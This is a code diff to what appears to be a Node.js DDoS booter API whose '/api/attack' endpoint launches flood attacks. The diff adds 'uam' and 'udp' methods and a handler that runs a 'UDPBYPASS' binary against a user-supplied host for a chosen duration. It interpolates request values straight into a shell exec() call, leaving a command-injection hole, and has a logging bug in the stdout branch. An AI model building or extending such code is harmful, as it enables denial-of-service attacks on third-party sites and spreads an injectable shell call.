@@ -90,6 +90,8 @@ app.get("/api/attack", (req, res) => {
     !(
       method.toLowerCase() === "http" ||
       method.toLowerCase() === "cloudflare" ||
+      method.toLowerCase() === "uam" ||
+      method.toLowerCase() === "udp" ||
       method.toLowerCase() === "bypass"
 
     )
@@ -156,8 +158,26 @@ app.get("/api/attack", (req, res) => {
         console.log(`[${clientIP}] Command [bypass] executed successfully`);
       },
     );
-  }
+  }  if (method.toLowerCase() === "udp") {
 
+    exec(
+      `./UDPBYPASS ${host} ${time}`,
+      (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Error: ${error.message}`);
+          return;
+        }
+        if (stderr) {
+          console.error(`stderr: ${stderr}`);
+          return;
+        }
+        if (stdout) {
+          console.error(`stderr: ${stderr}`);
+        }
+        console.log(`[${clientIP}] Command [udp] executed successfully`);
+      },
+    );
+  }
   if (method.toLowerCase() === "cloudflare") {
 
     exec(
